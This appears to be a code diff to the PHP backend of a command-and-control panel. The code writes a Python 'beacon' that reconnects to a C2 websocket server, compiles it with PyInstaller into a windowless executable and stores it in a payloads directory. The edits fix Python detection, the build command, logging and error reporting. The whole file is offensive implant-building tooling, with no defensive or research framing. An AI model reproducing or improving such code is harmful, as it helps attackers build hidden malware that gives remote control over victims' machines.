@@ -76,8 +76,8 @@ import uuid
 try:
     import websocket
 except ImportError:
-    os.system('pip install websocket-client')
-    import websocket
+    # Try basic fallback if pip install fails
+    pass
 
 C2_SERVER = "ws://{$serverIp}:{$serverPort}"
 RECONNECT_DELAY = 5
@@ -166,8 +166,12 @@ class Beacon:
     def connect(self):
         while self.running:
             try:
+                import websocket
                 self.ws = websocket.WebSocketApp(C2_SERVER, on_message=self.on_message, on_open=self.on_open, on_close=self.on_close, on_error=self.on_error)
                 self.ws.run_forever()
+            except ImportError:
+                # If websocket missing even after build
+                pass
             except:
                 pass
             if self.running:
@@ -185,28 +189,41 @@ PYTHON;
         file_put_contents($tempDir . '/beacon.py', $beaconCode);
 
         // Detect Python
-        $python = 'python3';
+        $python = 'python'; // Default
         exec('which python3', $out, $ret);
-        if ($ret !== 0) {
-            $python = 'python';
+        if ($ret === 0 && !empty($out[0])) {
+            $python = trim($out[0]);
+        } else {
+             exec('which python', $out2, $ret2);
+             if ($ret2 === 0 && !empty($out2[0])) {
+                 $python = trim($out2[0]);
+             }
         }
 
-        $debug = [
-            'user' => exec('whoami'),
-            'path' => getenv('PATH'),
-            'python' => $python,
-            'temp' => $tempDir
-        ];
-
+        // Try to handle PyInstaller (Linux path issue)
         $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
-        $cdCmd = $isWindows ? 'cd /d' : 'cd';
         
-        $buildCmd = "$cdCmd \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
+        // This is safer than relying on PATH for www-data
+        // We now use python -m PyInstaller if possible
+        $buildCmd = "";
+        
+        if ($isWindows) {
+             $buildCmd = "cd /d \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
+        } else {
+             // Linux: Try direct path if module fails, but module is preferred
+             // Add /home/user/.local/bin to PATH for this session just in case
+             $debugPath = getenv('PATH') . ":/usr/local/bin:/home/" . exec('whoami') . "/.local/bin";
+             $buildCmd = "export PATH=\"$debugPath\" && cd \"$tempDir\" && $python -m PyInstaller --onefile --noconsole --clean --name beacon beacon.py 2>&1";
+        }
         
         // Run process with pipe to capture STDERR
         $descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
         $process = proc_open($buildCmd, $descriptors, $pipes, $tempDir);
         
+        $buildOutput = "";
+        $buildErrors = "";
+        $buildCode = -1;
+
         if (is_resource($process)) {
             $buildOutput = stream_get_contents($pipes[1]);
             $buildErrors = stream_get_contents($pipes[2]);
@@ -214,16 +231,24 @@ PYTHON;
             fclose($pipes[2]);
             $buildCode = proc_close($process);
         } else {
-            $buildOutput = "";
             $buildErrors = "Failed to spawn process";
-            $buildCode = -1;
         }
 
-        // Write debug log
+        // Collect Debug Info
+        $debug = [
+            'user' => exec('whoami'),
+            'php_version' => phpversion(),
+            'python_detected' => $python,
+            'cmd' => $buildCmd,
+            'temp_dir' => $tempDir,
+            'path_env' => getenv('PATH')
+        ];
+
+        // Logs
         $logDir = __DIR__ . '/../data/logs';
         if (!file_exists($logDir)) mkdir($logDir, 0777, true);
         file_put_contents($logDir . '/build.log', 
-            date('c') . " CMD: $buildCmd\nOUT: $buildOutput\nERR: $buildErrors\nDBG: " . json_encode($debug) . "\n\n", 
+            date('c') . " CMD: $buildCmd\nCODE: $buildCode\nOUT: $buildOutput\nERR: $buildErrors\nDBG: " . json_encode($debug) . "\n\n", 
             FILE_APPEND
         );
 
@@ -232,9 +257,10 @@ PYTHON;
         if (file_exists($exePath)) {
             copy($exePath, $payloadsDir . '/' . $beaconName);
             
-            array_map('unlink', glob($tempDir . '/dist/*'));
-            array_map('unlink', glob($tempDir . '/build/*'));
-            array_map('unlink', glob($tempDir . '/*.*'));
+            // Cleanup
+            @array_map('unlink', glob($tempDir . '/dist/*'));
+            @array_map('unlink', glob($tempDir . '/build/*'));
+            @array_map('unlink', glob($tempDir . '/*.*'));
             @rmdir($tempDir . '/dist');
             @rmdir($tempDir . '/build');
             @rmdir($tempDir);
@@ -245,11 +271,12 @@ PYTHON;
                 'message' => 'Beacon built successfully'
             ]);
         } else {
+            // Return 200 with error details so UI can display it
             jsonResponse([
                 'error' => 'Build failed',
-                'details' => "Code: $buildCode\nOutput: $buildOutput\nError: $buildErrors",
+                'details' => "Exit Code: $buildCode\n\nOutput:\n$buildOutput\n\nErrors:\n$buildErrors",
                 'debug' => $debug
-            ], 500);
+            ], 200);
         }
         break;
 
